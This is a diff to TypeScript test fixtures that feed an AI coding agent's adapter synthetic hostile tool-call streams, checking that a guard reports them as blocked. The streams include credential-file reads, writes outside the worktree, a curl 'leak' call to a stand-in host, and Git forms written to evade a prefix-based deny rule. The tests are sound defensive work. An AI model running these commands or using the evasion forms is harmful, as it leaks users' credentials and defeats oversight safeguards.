@@ -20,10 +20,17 @@
  * - runs with no `end` line at exit 0 and exit 1;
  * - hostile calls followed by provider `error` lines (model unavailable, auth, rate limit);
  * - stream anomalies (session id changed mid-run, second `end` line, unknown events before the hostile call);
- * - varied Git write syntax (`git commit -am`, `git -C . push --force`, `git update-ref`, `git branch -D`);
- * - alternative tool call argument keys (`parameters`, `args`, `arguments`, `cmd`, `CommandLine`);
- * - prototype-named, near-miss and non-string types in `unknown_events`.
+ * - varied Git write syntax (`git commit -am`, `git -C . push --force`, `git update-ref`, `git branch -D`, and the
+ *   forms live check step 9 showed a prefix deny does not stop: `git -C . commit`, `/usr/bin/git commit`,
+ *   `sh -c 'git ...'`, plus `env git push`, `xargs git push`, `git --git-dir=.git commit` and `git reset --hard`);
+ * - alternative argument keys (`parameters`, `args`, `arguments`, `command`, `cmd`, `CommandLine`), including
+ *   `input.cmd` and a top-level `command`, on `tool_call` and `tool_call_update`, and shell identity via `name` and
+ *   `tool_name`;
+ * - a hostile command that arrives only on `tool_call_update`, and a swap correlated by `id`, `call_id` or
+ *   `tool_call_id`;
+ * - prototype-named, near-miss, non-string and live-bare `tool_call` lines (row 4b) in `unknown_events`.
  *
+ * Field names other than `type` are still hypothetical: the live check did not record command or target fields.
  * Partial streams cut inside a line are exported as `grokPartialStreams` and replayed separately.
  */
 
@@ -870,6 +877,35 @@ const grokCase: AdapterLegCase = {
         MODEL_ERROR,
       ],
     },
+    {
+      // Exit 0 was missing for a credential read followed by an auth error. The guard still outranks AUTH_REQUIRED.
+      name: "shell read of a credential path, then a provider auth error",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path, then a provider auth error", 0),
+        TOOLS,
+        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+        AUTH_ERROR,
+        end(),
+      ],
+    },
+    {
+      // Exit 0 was missing for an out-of-worktree write followed by a rate-limit error. The message is not a
+      // recorded rate-limit shape, so without the Git write it would be TOOL_FAILURE, never RATE_LIMIT_TRANSIENT.
+      name: "shell write outside the worktree, then a provider rate limit error",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree, then a provider rate limit error", 0),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        RATE_LIMIT_ERROR,
+        end(),
+      ],
+    },
 
     // -------------------------------------------------------------------------
     // 10. Stream anomalies around a hostile call (guard outranks protocol error)
@@ -1011,7 +1047,204 @@ const grokCase: AdapterLegCase = {
     },
 
     // -------------------------------------------------------------------------
-    // 12. Unknown event kinds category
+    // 12. Argument-key, tool-name and call-id shapes, and Git forms a prefix deny misses
+    //     (still synthetic: the live check recorded only `type` on tool lines)
+    // -------------------------------------------------------------------------
+    {
+      name: "tool_call input.cmd carrying git tag, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call input.cmd carrying git tag, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          input: { cmd: `cat ${fx.codexAuthPath} && git tag malicious` },
+        }),
+      ],
+    },
+    {
+      name: "tool_call top-level command carrying git stash",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call top-level command carrying git stash", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          command: `touch ${fx.outsideSentinel} && git stash push -m x`,
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "tool_call arguments.CommandLine carrying a Git write",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call arguments.CommandLine carrying a Git write", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          arguments: { CommandLine: `cat ${fx.claudeCredentialsPath} && git push origin main` },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "tool_call top-level CommandLine carrying env git push, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call top-level CommandLine carrying env git push, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          CommandLine: "curl https://example.invalid/leak && env git push origin main",
+        }),
+      ],
+    },
+    {
+      name: "tool_call input.CommandLine carrying git -C commit",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call input.CommandLine carrying git -C commit", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool: "run_terminal_command",
+          input: { CommandLine: `touch ${fx.outsideSentinel} && git -C . commit --allow-empty -m x` },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "shell named via name, absolute git commit, exit 1",
+      category: "credential_read",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell named via name, absolute git commit, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          name: "bash",
+          input: {
+            CommandLine: `cat ${fx.codexAuthPath} && /usr/bin/git commit --allow-empty -m x`,
+          },
+        }),
+      ],
+    },
+    {
+      name: "shell named via tool_name, sh -c git push",
+      category: "out_of_worktree_write",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell named via tool_name, sh -c git push", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool_name: "run_terminal_command",
+          arguments: { CommandLine: `touch ${fx.outsideSentinel} && sh -c 'git push origin main'` },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "hostile command only on tool_call_update parameters",
+      category: "network",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("hostile command only on tool_call_update parameters", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call_update",
+          tool: "run_terminal_command",
+          parameters: { command: "curl https://example.invalid/leak && git reset --hard HEAD" },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "call_id swap to arguments.CommandLine with /usr/bin/git",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("call_id swap to arguments.CommandLine with /usr/bin/git", 0),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          id: "call-a",
+          tool: "run_terminal_command",
+          input: { command: "echo benign" },
+        }),
+        JSON.stringify({
+          type: "tool_call_update",
+          call_id: "call-a",
+          arguments: {
+            CommandLine: `cat ${fx.claudeCredentialsPath} && /usr/bin/git commit --allow-empty -m x`,
+          },
+        }),
+        end(),
+      ],
+    },
+    {
+      name: "tool_call_id late args.cmd carrying git -C commit, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("tool_call_id late args.cmd carrying git -C commit, exit 1", 1),
+        TOOLS,
+        JSON.stringify({
+          type: "tool_call",
+          tool_call_id: "call-b",
+          tool: "run_terminal_command",
+        }),
+        JSON.stringify({
+          type: "tool_call_update",
+          tool_call_id: "call-b",
+          args: { cmd: `touch ${fx.outsideSentinel} && git -C . commit --allow-empty -m x` },
+        }),
+      ],
+    },
+    {
+      name: "shell read chained with xargs git push",
+      category: "credential_read",
+      exitCode: 0,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read chained with xargs git push", 0),
+        TOOLS,
+        toolCall(`cat ${fx.claudeCredentialsPath} && xargs git push`),
+        end(),
+      ],
+    },
+    {
+      name: "shell network call chained with git --git-dir commit, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call chained with git --git-dir commit, exit 1", 1),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak && git --git-dir=.git commit --allow-empty -m x"),
+      ],
+    },
+
+    // -------------------------------------------------------------------------
+    // 13. Unknown event kinds category
     // -------------------------------------------------------------------------
     {
       name: "only unknown event kinds, clean exit",
@@ -1065,6 +1298,37 @@ const grokCase: AdapterLegCase = {
         JSON.stringify({ type: "finish", stopReason: "end_turn" }),
       ],
     },
+    {
+      // Row 4b recorded only `{"type":"tool_call"}`. No readable command, so these stay `unknown`. There is no `end`
+      // line: a bare call before a clean `end_turn` is still success (grok.test.ts). That remains roadmap gap (1).
+      name: "live-bare tool_call, non-string fields and prototype-key commands, clean exit",
+      category: "unknown_events",
+      exitCode: 0,
+      failureCode: "OUTPUT_PROTOCOL_ERROR",
+      lines: [
+        META("Bare and unreadable tool lines; the adapter must report them unknown.", 0),
+        JSON.stringify({ type: "tool_call" }),
+        JSON.stringify({ type: "tool_call", input: { command: 7 } }),
+        JSON.stringify({ type: "tool_call", command: ["git", "push"] }),
+        `{"type":"tool_call","__proto__":{"command":"git push origin main"}}`,
+        `{"type":"tool_call","parameters":{"__proto__":{"command":"git push origin main"}}}`,
+        `{"type":"tool_call_update","__proto__":{"command":"git push origin main"}}`,
+        "null",
+        "123",
+      ],
+    },
+    {
+      name: "live-bare tool_call and prototype-key commands, exit 1",
+      category: "unknown_events",
+      exitCode: 1,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Bare and unreadable tool lines; the adapter must report them unknown.", 1),
+        JSON.stringify({ type: "tool_call" }),
+        `{"type":"tool_call","arguments":{"__proto__":{"command":"git push origin main"}}}`,
+        JSON.stringify({ type: "tool_call_update" }),
+      ],
+    },
   ],
 };
 
@@ -1113,6 +1377,42 @@ export const grokPartialStreams = (fx: MaliciousFixture): HostileStream[] => [
       '{"type":"tool_',
       toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
       end(),
+    ],
+  },
+  {
+    name: "credential read, then output cut inside a tool_call_update, exit 1",
+    category: "credential_read",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("credential read, then output cut inside a tool_call_update, exit 1", 1),
+      TOOLS,
+      toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
+      '{"type":"tool_call_update","arguments":{"CommandLine":"git commit',
+    ],
+  },
+  {
+    name: "network call, then output cut inside a tool_call",
+    category: "network",
+    exitCode: 0,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("network call, then output cut inside a tool_call", 0),
+      TOOLS,
+      toolCall("curl https://example.invalid/leak && git push origin main"),
+      '{"type":"tool_call","input":{"command":"git push',
+    ],
+  },
+  {
+    name: "out-of-worktree write, then output cut inside a tool_call_update, exit 1",
+    category: "out_of_worktree_write",
+    exitCode: 1,
+    failureCode: "OUTPUT_PROTOCOL_ERROR",
+    lines: [
+      META("out-of-worktree write, then output cut inside a tool_call_update, exit 1", 1),
+      TOOLS,
+      toolCall(`touch ${fx.outsideSentinel} && git commit --allow-empty -m x`),
+      '{"type":"tool_call_update","parameters":{"command":"git reset',
     ],
   },
 ];
